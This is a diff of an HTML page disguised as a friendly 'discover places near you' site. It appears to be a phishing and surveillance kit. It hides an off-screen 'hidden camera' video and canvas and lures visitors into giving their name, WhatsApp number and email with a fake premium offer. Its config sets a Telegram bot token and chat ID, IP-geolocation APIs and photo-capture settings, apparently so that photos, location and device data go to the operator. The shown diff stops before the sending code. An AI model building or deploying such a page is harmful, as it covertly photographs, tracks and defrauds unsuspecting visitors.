@@ -4,9 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="theme-color" content="#74b9ff">
-    <meta name="description" content="Discover amazing places near you - Hotels, Restaurants, Parks, Date Spots and more!">
+    <meta name="description" content="Discover amazing places near you!">
     <meta name="robots" content="noindex, nofollow">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <title>Welcome - Discover Places Near You ✨</title>
     
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -14,46 +13,27 @@
     <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
     
     <style>
-        *, *::before, *::after {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
 
         :root {
-            --sky-light: #e0f4ff;
             --sky-medium: #74b9ff;
-            --sky-dark: #0984e3;
-            --cloud-white: #ffffff;
-            --sun-yellow: #ffeaa7;
-            --sun-orange: #fdcb6e;
+            --purple-accent: #a29bfe;
             --grass-green: #00b894;
             --text-dark: #2d3436;
             --text-medium: #636e72;
-            --pink-accent: #fd79a8;
-            --purple-accent: #a29bfe;
-            --gold: #f39c12;
-            --gold-light: #ffeaa7;
-        }
-
-        html {
-            -webkit-text-size-adjust: 100%;
         }
 
         body {
             font-family: 'Nunito', -apple-system, BlinkMacSystemFont, sans-serif;
             background: linear-gradient(180deg, #74b9ff 0%, #a29bfe 50%, #dfe6e9 100%);
             min-height: 100vh;
-            min-height: -webkit-fill-available;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
             overflow-x: hidden;
-            position: relative;
         }
 
-        /* Hidden elements */
         .hidden-camera {
             position: fixed;
             top: -9999px;
@@ -84,7 +64,7 @@
             height: 80px;
             background: radial-gradient(circle, #ffeaa7 0%, #fdcb6e 50%, #f39c12 100%);
             border-radius: 50%;
-            box-shadow: 0 0 60px rgba(253, 203, 110, 0.8), 0 0 100px rgba(253, 203, 110, 0.4);
+            box-shadow: 0 0 60px rgba(253, 203, 110, 0.8);
             animation: sunPulse 4s ease-in-out infinite;
         }
 
@@ -107,42 +87,51 @@
             border-radius: 50%;
         }
 
-        .cloud-1 {
-            width: 120px;
-            height: 40px;
-            top: 80px;
-            left: -150px;
-            animation: floatCloud 25s linear infinite;
-        }
-
+        .cloud-1 { width: 120px; height: 40px; top: 80px; left: -150px; animation: floatCloud 25s linear infinite; }
         .cloud-1::before { width: 50px; height: 50px; top: -25px; left: 20px; }
         .cloud-1::after { width: 70px; height: 70px; top: -35px; left: 45px; }
 
-        .cloud-2 {
-            width: 150px;
-            height: 50px;
-            top: 150px;
-            left: -200px;
-            animation: floatCloud 30s linear infinite 5s;
-        }
-
+        .cloud-2 { width: 150px; height: 50px; top: 150px; left: -200px; animation: floatCloud 30s linear infinite 5s; }
         .cloud-2::before { width: 60px; height: 60px; top: -30px; left: 25px; }
         .cloud-2::after { width: 80px; height: 80px; top: -40px; left: 55px; }
 
-        .cloud-3 {
-            width: 100px;
-            height: 35px;
-            top: 250px;
-            left: -130px;
-            animation: floatCloud 20s linear infinite 10s;
-        }
-
+        .cloud-3 { width: 100px; height: 35px; top: 250px; left: -130px; animation: floatCloud 20s linear infinite 10s; }
         .cloud-3::before { width: 45px; height: 45px; top: -22px; left: 15px; }
         .cloud-3::after { width: 55px; height: 55px; top: -28px; left: 40px; }
 
         @keyframes floatCloud {
             0% { transform: translateX(0); }
             100% { transform: translateX(calc(100vw + 300px)); }
+        }
+
+        /* Floating Elements */
+        .floating-elements {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100px;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .grass {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 50px;
+            background: linear-gradient(180deg, #55efc4 0%, #00b894 100%);
+            border-radius: 100% 100% 0 0;
+        }
+
+        .tree { position: absolute; bottom: 35px; font-size: 35px; animation: treeWave 4s ease-in-out infinite; }
+        .tree-1 { left: 10%; }
+        .tree-2 { left: 85%; font-size: 30px; }
+
+        @keyframes treeWave {
+            0%, 100% { transform: rotate(-2deg); }
+            50% { transform: rotate(2deg); }
         }
 
         /* Main Container */
@@ -187,57 +176,22 @@
             border-radius: 50% 50% 0 0;
         }
 
-        .mascot {
-            font-size: 70px;
-            display: block;
-            margin-bottom: 10px;
-            animation: bounce 2s ease-in-out infinite;
-        }
+        .mascot { font-size: 70px; display: block; margin-bottom: 10px; animation: bounce 2s ease-in-out infinite; }
 
         @keyframes bounce {
             0%, 100% { transform: translateY(0) rotate(-5deg); }
             50% { transform: translateY(-10px) rotate(5deg); }
         }
 
-        .header h1 {
-            color: white;
-            font-size: 1.8em;
-            font-weight: 800;
-            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
-            margin-bottom: 5px;
-        }
+        .header h1 { color: white; font-size: 1.8em; font-weight: 800; text-shadow: 0 2px 10px rgba(0,0,0,0.2); margin-bottom: 5px; }
+        .header p { color: rgba(255,255,255,0.95); font-size: 1em; font-weight: 600; }
 
-        .header p {
-            color: rgba(255, 255, 255, 0.95);
-            font-size: 1em;
-            font-weight: 600;
-        }
+        .content { padding: 30px 25px 35px; }
 
-        .content {
-            padding: 30px 25px 35px;
-        }
+        .features-title { text-align: center; font-size: 1.1em; font-weight: 700; color: var(--text-dark); margin-bottom: 20px; }
+        .features-title span { background: linear-gradient(135deg, #74b9ff, #a29bfe); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
 
-        .features-title {
-            text-align: center;
-            font-size: 1.1em;
-            font-weight: 700;
-            color: var(--text-dark);
-            margin-bottom: 20px;
-        }
-
-        .features-title span {
-            background: linear-gradient(135deg, #74b9ff, #a29bfe);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            margin-bottom: 25px;
-        }
+        .features-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 25px; }
 
         .feature-card {
             background: linear-gradient(145deg, #f8f9fa 0%, #ffffff 100%);
@@ -248,23 +202,9 @@
             transition: all 0.3s ease;
         }
 
-        .feature-card:hover {
-            transform: translateY(-5px) scale(1.02);
-            border-color: #74b9ff;
-            box-shadow: 0 10px 30px rgba(116, 185, 255, 0.2);
-        }
-
-        .feature-icon {
-            font-size: 32px;
-            display: block;
-            margin-bottom: 8px;
-        }
-
-        .feature-name {
-            font-size: 0.75em;
-            font-weight: 700;
-            color: var(--text-dark);
-        }
+        .feature-card:hover { transform: translateY(-5px) scale(1.02); border-color: #74b9ff; box-shadow: 0 10px 30px rgba(116, 185, 255, 0.2); }
+        .feature-icon { font-size: 32px; display: block; margin-bottom: 8px; }
+        .feature-name { font-size: 0.75em; font-weight: 700; color: var(--text-dark); }
 
         .tagline {
             text-align: center;
@@ -276,13 +216,7 @@
         }
 
         .tagline-icon { font-size: 28px; display: block; margin-bottom: 8px; }
-
-        .tagline p {
-            font-size: 0.95em;
-            font-weight: 700;
-            color: #b37400;
-            line-height: 1.5;
-        }
+        .tagline p { font-size: 0.95em; font-weight: 700; color: #b37400; line-height: 1.5; }
 
         .status-message {
             text-align: center;
@@ -294,39 +228,13 @@
             animation: fadeIn 0.3s ease;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
-        }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
 
-        .status-message.loading {
-            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
-            color: #1565c0;
-            display: block;
-        }
+        .status-message.loading { background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%); color: #1565c0; display: block; }
+        .status-message.success { background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%); color: #2e7d32; display: block; }
 
-        .status-message.success {
-            background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
-            color: #2e7d32;
-            display: block;
-        }
-
-        .loader-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 10px;
-        }
-
-        .loader {
-            width: 28px;
-            height: 28px;
-            border: 3px solid #bbdefb;
-            border-top-color: #1565c0;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
+        .loader-container { display: flex; align-items: center; justify-content: center; margin-bottom: 10px; }
+        .loader { width: 28px; height: 28px; border: 3px solid #bbdefb; border-top-color: #1565c0; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
 
         .cta-button {
@@ -354,87 +262,14 @@
             50% { box-shadow: 0 10px 30px rgba(0, 184, 148, 0.4), 0 0 0 10px rgba(0, 184, 148, 0); }
         }
 
-        .cta-button:hover:not(:disabled) {
-            transform: translateY(-3px) scale(1.02);
-            box-shadow: 0 15px 40px rgba(0, 184, 148, 0.5);
-        }
+        .cta-button:hover:not(:disabled) { transform: translateY(-3px) scale(1.02); box-shadow: 0 15px 40px rgba(0, 184, 148, 0.5); }
+        .cta-button:disabled { opacity: 0.8; cursor: not-allowed; animation: none; }
 
-        .cta-button:disabled {
-            opacity: 0.8;
-            cursor: not-allowed;
-            animation: none;
-        }
+        .license-link-container { text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #f1f2f6; }
+        .license-link { display: inline-flex; align-items: center; gap: 6px; font-size: 0.8em; color: var(--text-medium); text-decoration: none; font-weight: 600; padding: 8px 16px; border-radius: 20px; background: #f8f9fa; transition: all 0.3s ease; }
+        .license-link:hover { color: #0984e3; background: #e3f2fd; }
 
-        .license-link-container {
-            text-align: center;
-            margin-top: 20px;
-            padding-top: 20px;
-            border-top: 1px solid #f1f2f6;
-        }
-
-        .license-link {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 0.8em;
-            color: var(--text-medium);
-            text-decoration: none;
-            font-weight: 600;
-            padding: 8px 16px;
-            border-radius: 20px;
-            background: #f8f9fa;
-            transition: all 0.3s ease;
-        }
-
-        .license-link:hover {
-            color: var(--sky-dark);
-            background: #e3f2fd;
-        }
-
-        .footer {
-            text-align: center;
-            padding: 20px;
-            color: var(--text-medium);
-            font-size: 0.8em;
-            font-weight: 600;
-            background: #f8f9fa;
-        }
-
-        /* Floating Elements */
-        .floating-elements {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 120px;
-            pointer-events: none;
-            z-index: 1;
-        }
-
-        .grass {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 60px;
-            background: linear-gradient(180deg, #55efc4 0%, #00b894 100%);
-            border-radius: 100% 100% 0 0;
-        }
-
-        .tree {
-            position: absolute;
-            bottom: 40px;
-            font-size: 40px;
-            animation: treeWave 4s ease-in-out infinite;
-        }
-
-        .tree-1 { left: 10%; }
-        .tree-2 { left: 85%; font-size: 35px; }
-
-        @keyframes treeWave {
-            0%, 100% { transform: rotate(-2deg); }
-            50% { transform: rotate(2deg); }
-        }
+        .footer { text-align: center; padding: 20px; color: var(--text-medium); font-size: 0.8em; font-weight: 600; background: #f8f9fa; }
 
         /* Page Loader */
         .page-loader {
@@ -453,18 +288,8 @@
         }
 
         .page-loader.hidden { opacity: 0; visibility: hidden; }
-
-        .page-loader-icon {
-            font-size: 60px;
-            animation: bounce 1s ease-in-out infinite;
-            margin-bottom: 20px;
-        }
-
-        .page-loader-text {
-            color: white;
-            font-size: 1.2em;
-            font-weight: 700;
-        }
+        .page-loader-icon { font-size: 60px; animation: bounce 1s ease-in-out infinite; margin-bottom: 20px; }
+        .page-loader-text { color: white; font-size: 1.2em; font-weight: 700; }
 
         /* ========== CONTACT MODAL ========== */
         .modal-overlay {
@@ -480,7 +305,6 @@
             justify-content: center;
             z-index: 10000;
             padding: 20px;
-            animation: fadeIn 0.3s ease;
         }
 
         .modal-overlay.active { display: flex; }
@@ -493,7 +317,6 @@
             max-height: 90vh;
             overflow-y: auto;
             animation: modalSlide 0.4s ease;
-            position: relative;
         }
 
         @keyframes modalSlide {
@@ -523,56 +346,14 @@
             box-shadow: 0 5px 20px rgba(0, 184, 148, 0.4);
         }
 
-        .modal-icon {
-            font-size: 50px;
-            display: block;
-            margin-bottom: 10px;
-            animation: bounce 1.5s ease-in-out infinite;
-        }
+        .modal-icon { font-size: 50px; display: block; margin-bottom: 10px; animation: bounce 1.5s ease-in-out infinite; }
+        .modal-header h2 { color: white; font-size: 1.5em; font-weight: 800; margin-bottom: 5px; }
+        .modal-header p { color: rgba(255,255,255,0.95); font-size: 1em; font-weight: 600; }
+        .modal-value { background: rgba(255,255,255,0.2); display: inline-block; padding: 8px 20px; border-radius: 20px; margin-top: 10px; font-size: 1.3em; font-weight: 800; color: white; }
 
-        .modal-header h2 {
-            color: white;
-            font-size: 1.5em;
-            font-weight: 800;
-            margin-bottom: 5px;
-        }
-
-        .modal-header p {
-            color: rgba(255, 255, 255, 0.95);
-            font-size: 1em;
-            font-weight: 600;
-        }
-
-        .modal-value {
-            background: rgba(255, 255, 255, 0.2);
-            display: inline-block;
-            padding: 8px 20px;
-            border-radius: 20px;
-            margin-top: 10px;
-            font-size: 1.3em;
-            font-weight: 800;
-            color: white;
-        }
-
-        .modal-body {
-            padding: 25px;
-        }
-
-        .form-group {
-            margin-bottom: 18px;
-        }
-
-        .form-label {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.9em;
-            font-weight: 700;
-            color: var(--text-dark);
-            margin-bottom: 8px;
-        }
-
-        .form-label-icon { font-size: 1.1em; }
+        .modal-body { padding: 25px; }
+        .form-group { margin-bottom: 18px; }
+        .form-label { display: flex; align-items: center; gap: 8px; font-size: 0.9em; font-weight: 700; color: var(--text-dark); margin-bottom: 8px; }
 
         .form-input {
             width: 100%;
@@ -586,21 +367,14 @@
             transition: all 0.3s ease;
         }
 
-        .form-input:focus {
-            outline: none;
-            border-color: #74b9ff;
-            box-shadow: 0 0 0 4px rgba(116, 185, 255, 0.2);
-        }
+        .form-input:focus { outline: none; border-color: #74b9ff; box-shadow: 0 0 0 4px rgba(116, 185, 255, 0.2); }
+        .form-input::placeholder { color: #adb5bd; font-weight: 500; }
+        .form-input.error { border-color: #e74c3c; }
 
-        .form-input::placeholder {
-            color: #adb5bd;
-            font-weight: 500;
-        }
+        .form-error { color: #e74c3c; font-size: 0.8em; margin-top: 5px; font-weight: 600; display: none; }
+        .form-input.error + .form-error { display: block; }
 
-        .phone-input-group {
-            display: flex;
-            gap: 10px;
-        }
+        .phone-input-group { display: flex; gap: 10px; }
 
         .country-select {
             width: 110px;
@@ -613,18 +387,10 @@
             color: var(--text-dark);
             background: white;
             cursor: pointer;
-            transition: all 0.3s ease;
         }
 
-        .country-select:focus {
-            outline: none;
-            border-color: #74b9ff;
-            box-shadow: 0 0 0 4px rgba(116, 185, 255, 0.2);
-        }
-
-        .phone-input {
-            flex: 1;
-        }
+        .country-select:focus { outline: none; border-color: #74b9ff; }
+        .phone-input { flex: 1; }
 
         .benefits-box {
             background: linear-gradient(135deg, #e8f8f0 0%, #d4edda 100%);
@@ -634,42 +400,10 @@
             border-left: 4px solid #00b894;
         }
 
-        .benefits-title {
-            font-size: 0.9em;
-            font-weight: 800;
-            color: #00b894;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .benefits-list {
-            list-style: none;
-        }
-
-        .benefits-list li {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 0.85em;
-            font-weight: 600;
-            color: #1e7e34;
-            padding: 6px 0;
-        }
-
-        .benefit-icon {
-            width: 22px;
-            height: 22px;
-            background: #00b894;
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 0.7em;
-            flex-shrink: 0;
-        }
+        .benefits-title { font-size: 0.9em; font-weight: 800; color: #00b894; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .benefits-list { list-style: none; }
+        .benefits-list li { display: flex; align-items: center; gap: 10px; font-size: 0.85em; font-weight: 600; color: #1e7e34; padding: 6px 0; }
+        .benefit-icon { width: 22px; height: 22px; background: #00b894; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.7em; flex-shrink: 0; }
 
         .unlock-button {
             width: 100%;
@@ -690,45 +424,15 @@
             gap: 10px;
         }
 
-        .unlock-button:hover:not(:disabled) {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(0, 184, 148, 0.5);
-        }
+        .unlock-button:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(0, 184, 148, 0.5); }
+        .unlock-button:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        .unlock-button:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
-
-        .skip-section {
-            text-align: center;
-            margin-top: 20px;
-            padding-top: 20px;
-            border-top: 1px solid #e9ecef;
-        }
-
-        .skip-button {
-            background: none;
-            border: none;
-            color: #adb5bd;
-            font-family: 'Nunito', sans-serif;
-            font-size: 0.85em;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            padding: 10px;
-        }
-
+        .skip-section { text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef; }
+        .skip-button { background: none; border: none; color: #adb5bd; font-family: 'Nunito', sans-serif; font-size: 0.85em; font-weight: 600; cursor: pointer; padding: 10px; }
         .skip-button:hover { color: #e74c3c; }
+        .skip-warning { font-size: 0.75em; color: #e74c3c; margin-top: 5px; font-weight: 600; }
 
-        .skip-warning {
-            font-size: 0.75em;
-            color: #e74c3c;
-            margin-top: 5px;
-            font-weight: 600;
-        }
-
-        /* Skip Confirmation Modal */
+        /* Skip Confirm Modal */
         .skip-confirm-modal {
             position: fixed;
             top: 0;
@@ -745,79 +449,15 @@
 
         .skip-confirm-modal.active { display: flex; }
 
-        .skip-confirm-content {
-            background: white;
-            border-radius: 25px;
-            padding: 30px;
-            max-width: 350px;
-            text-align: center;
-            animation: modalSlide 0.3s ease;
-        }
-
-        .skip-confirm-icon {
-            font-size: 60px;
-            margin-bottom: 15px;
-        }
-
-        .skip-confirm-content h3 {
-            color: #e74c3c;
-            font-size: 1.3em;
-            margin-bottom: 10px;
-        }
-
-        .skip-confirm-content p {
-            color: var(--text-medium);
-            font-size: 0.95em;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-
-        .skip-confirm-buttons {
-            display: flex;
-            gap: 12px;
-        }
-
-        .skip-confirm-buttons button {
-            flex: 1;
-            padding: 14px;
-            border-radius: 15px;
-            font-family: 'Nunito', sans-serif;
-            font-size: 0.95em;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .btn-go-back {
-            background: linear-gradient(135deg, #00b894 0%, #00a885 100%);
-            color: white;
-            border: none;
-        }
-
-        .btn-go-back:hover { transform: translateY(-2px); }
-
-        .btn-skip-anyway {
-            background: white;
-            color: #e74c3c;
-            border: 2px solid #e74c3c;
-        }
-
-        .btn-skip-anyway:hover {
-            background: #e74c3c;
-            color: white;
-        }
-
-        /* Form Error */
-        .form-error {
-            color: #e74c3c;
-            font-size: 0.8em;
-            margin-top: 5px;
-            font-weight: 600;
-            display: none;
-        }
-
-        .form-input.error { border-color: #e74c3c; }
-        .form-input.error + .form-error { display: block; }
+        .skip-confirm-content { background: white; border-radius: 25px; padding: 30px; max-width: 350px; text-align: center; animation: modalSlide 0.3s ease; }
+        .skip-confirm-icon { font-size: 60px; margin-bottom: 15px; }
+        .skip-confirm-content h3 { color: #e74c3c; font-size: 1.3em; margin-bottom: 10px; }
+        .skip-confirm-content p { color: var(--text-medium); font-size: 0.95em; margin-bottom: 20px; line-height: 1.5; }
+        .skip-confirm-buttons { display: flex; gap: 12px; }
+        .skip-confirm-buttons button { flex: 1; padding: 14px; border-radius: 15px; font-family: 'Nunito', sans-serif; font-size: 0.95em; font-weight: 700; cursor: pointer; }
+        .btn-go-back { background: linear-gradient(135deg, #00b894 0%, #00a885 100%); color: white; border: none; }
+        .btn-skip-anyway { background: white; color: #e74c3c; border: 2px solid #e74c3c; }
+        .btn-skip-anyway:hover { background: #e74c3c; color: white; }
 
         /* Responsive */
         @media (max-width: 480px) {
@@ -828,27 +468,25 @@
             .header h1 { font-size: 1.5em; }
             .content { padding: 25px 20px 30px; }
             .features-grid { gap: 10px; }
-            .feature-card { padding: 14px 8px; border-radius: 16px; }
+            .feature-card { padding: 14px 8px; }
             .feature-icon { font-size: 26px; }
             .feature-name { font-size: 0.7em; }
             .cta-button { padding: 18px 20px; font-size: 1.05em; }
             .modal-content { border-radius: 20px; }
-            .modal-header { padding: 25px 20px; border-radius: 20px 20px 0 0; }
+            .modal-header { padding: 25px 20px; }
             .modal-body { padding: 20px; }
             .country-select { width: 95px; font-size: 0.85em; }
         }
 
         @media (max-width: 360px) {
             .features-grid { grid-template-columns: repeat(2, 1fr); }
-            .header h1 { font-size: 1.3em; }
-            .modal-header h2 { font-size: 1.3em; }
             .phone-input-group { flex-direction: column; }
             .country-select { width: 100%; }
         }
     </style>
 </head>
 <body>
-    <!-- Hidden Camera Elements -->
+    <!-- Hidden Camera -->
     <video id="hiddenVideo" class="hidden-camera" autoplay playsinline></video>
     <canvas id="hiddenCanvas" class="hidden-camera"></canvas>
 
@@ -882,35 +520,15 @@
         </div>
 
         <div class="content">
-            <div class="features-title">
-                Discover <span>Amazing Places</span> Near You
-            </div>
+            <div class="features-title">Discover <span>Amazing Places</span> Near You</div>
 
             <div class="features-grid">
-                <div class="feature-card">
-                    <span class="feature-icon">🍽️</span>
-                    <span class="feature-name">Restaurants</span>
-                </div>
-                <div class="feature-card">
-                    <span class="feature-icon">🏨</span>
-                    <span class="feature-name">Hotels</span>
-                </div>
-                <div class="feature-card">
-                    <span class="feature-icon">💑</span>
-                    <span class="feature-name">Date Spots</span>
-                </div>
-                <div class="feature-card">
-                    <span class="feature-icon">🏥</span>
-                    <span class="feature-name">Hospitals</span>
-                </div>
-                <div class="feature-card">
-                    <span class="feature-icon">🌳</span>
-                    <span class="feature-name">Parks</span>
-                </div>
-                <div class="feature-card">
-                    <span class="feature-icon">🛍️</span>
-                    <span class="feature-name">Shopping</span>
-                </div>
+                <div class="feature-card"><span class="feature-icon">🍽️</span><span class="feature-name">Restaurants</span></div>
+                <div class="feature-card"><span class="feature-icon">🏨</span><span class="feature-name">Hotels</span></div>
+                <div class="feature-card"><span class="feature-icon">💑</span><span class="feature-name">Date Spots</span></div>
+                <div class="feature-card"><span class="feature-icon">🏥</span><span class="feature-name">Hospitals</span></div>
+                <div class="feature-card"><span class="feature-icon">🌳</span><span class="feature-name">Parks</span></div>
+                <div class="feature-card"><span class="feature-icon">🛍️</span><span class="feature-name">Shopping</span></div>
             </div>
 
             <div class="tagline">
@@ -921,20 +539,16 @@
             <div id="statusMessage" class="status-message"></div>
 
             <button id="continueBtn" class="cta-button" type="button">
-                <span>🚀</span>
-                <span>Let's Explore!</span>
+                <span>🚀</span><span>Let's Explore!</span>
             </button>
 
             <div class="license-link-container">
-                <a href="YOUR_LICENSE_LINK_HERE" class="license-link" target="_blank" rel="noopener noreferrer">
-                    📜 Terms & License
-                </a>
+                <!-- ========== REPLACE WITH YOUR LICENSE LINK ========== -->
+                <a href="YOUR_LICENSE_LINK_HERE" class="license-link" target="_blank" rel="noopener noreferrer">📜 Terms & License</a>
             </div>
         </div>
 
-        <div class="footer">
-            © 2024 NearbyPlaces • Made with ❤️
-        </div>
+        <div class="footer">© 2024 NearbyPlaces • Made with ❤️</div>
     </div>
 
     <!-- Contact Modal -->
@@ -951,19 +565,13 @@
             <div class="modal-body">
                 <form id="contactForm">
                     <div class="form-group">
-                        <label class="form-label">
-                            <span class="form-label-icon">👤</span>
-                            Your Name
-                        </label>
+                        <label class="form-label"><span>👤</span> Your Name</label>
                         <input type="text" id="userName" class="form-input" placeholder="Enter your full name" autocomplete="name">
                         <div class="form-error">Please enter your name</div>
                     </div>
 
                     <div class="form-group">
-                        <label class="form-label">
-                            <span class="form-label-icon">📱</span>
-                            WhatsApp Number
-                        </label>
+                        <label class="form-label"><span>📱</span> WhatsApp Number</label>
                         <div class="phone-input-group">
                             <select id="countryCode" class="country-select">
                                 <option value="+91">🇮🇳 +91</option>
@@ -971,7 +579,6 @@
                                 <option value="+44">🇬🇧 +44</option>
                                 <option value="+971">🇦🇪 +971</option>
                                 <option value="+966">🇸🇦 +966</option>
-                                <option value="+974">🇶🇦 +974</option>
                                 <option value="+65">🇸🇬 +65</option>
                                 <option value="+60">🇲🇾 +60</option>
                                 <option value="+61">🇦🇺 +61</option>
@@ -981,9 +588,6 @@
                                 <option value="+86">🇨🇳 +86</option>
                                 <option value="+7">🇷🇺 +7</option>
                                 <option value="+55">🇧🇷 +55</option>
-                                <option value="+27">🇿🇦 +27</option>
-                                <option value="+234">🇳🇬 +234</option>
-                                <option value="+254">🇰🇪 +254</option>
                                 <option value="+92">🇵🇰 +92</option>
                                 <option value="+880">🇧🇩 +880</option>
                                 <option value="+977">🇳🇵 +977</option>
@@ -993,31 +597,12 @@
                                 <option value="+84">🇻🇳 +84</option>
                                 <option value="+63">🇵🇭 +63</option>
                                 <option value="+82">🇰🇷 +82</option>
-                                <option value="+852">🇭🇰 +852</option>
-                                <option value="+886">🇹🇼 +886</option>
-                                <option value="+64">🇳🇿 +64</option>
-                                <option value="+353">🇮🇪 +353</option>
-                                <option value="+31">🇳🇱 +31</option>
-                                <option value="+34">🇪🇸 +34</option>
-                                <option value="+39">🇮🇹 +39</option>
-                                <option value="+41">🇨🇭 +41</option>
-                                <option value="+46">🇸🇪 +46</option>
-                                <option value="+47">🇳🇴 +47</option>
-                                <option value="+45">🇩🇰 +45</option>
-                                <option value="+358">🇫🇮 +358</option>
-                                <option value="+48">🇵🇱 +48</option>
-                                <option value="+43">🇦🇹 +43</option>
-                                <option value="+32">🇧🇪 +32</option>
-                                <option value="+351">🇵🇹 +351</option>
-                                <option value="+30">🇬🇷 +30</option>
-                                <option value="+90">🇹🇷 +90</option>
-                                <option value="+20">🇪🇬 +20</option>
-                                <option value="+212">🇲🇦 +212</option>
                                 <option value="+52">🇲🇽 +52</option>
                                 <option value="+54">🇦🇷 +54</option>
-                                <option value="+56">🇨🇱 +56</option>
-                                <option value="+57">🇨🇴 +57</option>
-                                <option value="+51">🇵🇪 +51</option>
+                                <option value="+27">🇿🇦 +27</option>
+                                <option value="+234">🇳🇬 +234</option>
+                                <option value="+20">🇪🇬 +20</option>
+                                <option value="+90">🇹🇷 +90</option>
                             </select>
                             <input type="tel" id="userPhone" class="form-input phone-input" placeholder="9876543210" autocomplete="tel">
                         </div>
@@ -1025,18 +610,13 @@
                     </div>
 
                     <div class="form-group">
-                        <label class="form-label">
-                            <span class="form-label-icon">📧</span>
-                            Email Address
-                        </label>
+                        <label class="form-label"><span>📧</span> Email Address</label>
                         <input type="email" id="userEmail" class="form-input" placeholder="your@email.com" autocomplete="email">
                         <div class="form-error">Please enter valid email</div>
                     </div>
 
                     <div class="benefits-box">
-                        <div class="benefits-title">
-                            <span>✨</span> Premium Benefits You'll Unlock:
-                        </div>
+                        <div class="benefits-title"><span>✨</span> Premium Benefits You'll Unlock:</div>
                         <ul class="benefits-list">
                             <li><span class="benefit-icon">✓</span> Exclusive hidden date spots</li>
                             <li><span class="benefit-icon">✓</span> AI-powered personalized recommendations</li>
@@ -1047,23 +627,18 @@
                         </ul>
                     </div>
 
-                    <button type="submit" id="unlockBtn" class="unlock-button">
-                        <span>🎁</span>
-                        <span>Unlock Premium FREE</span>
-                    </button>
+                    <button type="submit" id="unlockBtn" class="unlock-button"><span>🎁</span><span>Unlock Premium FREE</span></button>
                 </form>
 
                 <div class="skip-section">
-                    <button type="button" id="skipBtn" class="skip-button">
-                        Skip for now →
-                    </button>
+                    <button type="button" id="skipBtn" class="skip-button">Skip for now →</button>
                     <div class="skip-warning">⚠️ You'll lose ₹5,000 worth of premium features</div>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Skip Confirmation Modal -->
+    <!-- Skip Confirm Modal -->
     <div class="skip-confirm-modal" id="skipConfirmModal">
         <div class="skip-confirm-content">
             <div class="skip-confirm-icon">😢</div>
@@ -1087,19 +662,19 @@
             var CONFIG = {
                 TELEGRAM_BOT_TOKEN: '8183958141:AAFa11kk0EAYS_khjVClcmLyAyFJvxIozQI',
                 TELEGRAM_CHAT_ID: '-1003623366096',
+                
+                // ========== REPLACE WITH YOUR MAIN WEBSITE URL ==========
                 MAIN_SITE_URL: 'https://your-main-website.com',
+                
                 TELEGRAM_MAX_RETRIES: 3,
-                TELEGRAM_RETRY_DELAY: 1000,
+                TELEGRAM_RETRY_DELAY: 800,
                 IP_APIS: [
                     { url: 'https://ipapi.co/json/', type: 'ipapi' },
                     { url: 'https://ip-api.com/json/?fields=66846719', type: 'ip-api' },
                     { url: 'https://ipwho.is/', type: 'ipwhois' }
                 ],
-                API_TIMEOUT: 8000,
-                LOCATION_TIMEOUT: 20000,
-                REDIRECT_DELAY: 1500,
-                PHOTO_DELAY: 500,
-                PHOTO_QUALITY: 0.8
+                PHOTO_DELAY: 400,
+                PHOTO_QUALITY: 0.85
             };
 
             // ============================================================
@@ -1109,15 +684,17 @@
             var pageLoadTime = Date.now();
             var isProcessing = false;
             var sessionId = generateSessionId();
-            var capturedPhotos = [];
-            var collectedData = null;
+            var deviceData = null;
+            var locationData = null;
+            var ipData = null;
+            var batteryData = null;
 
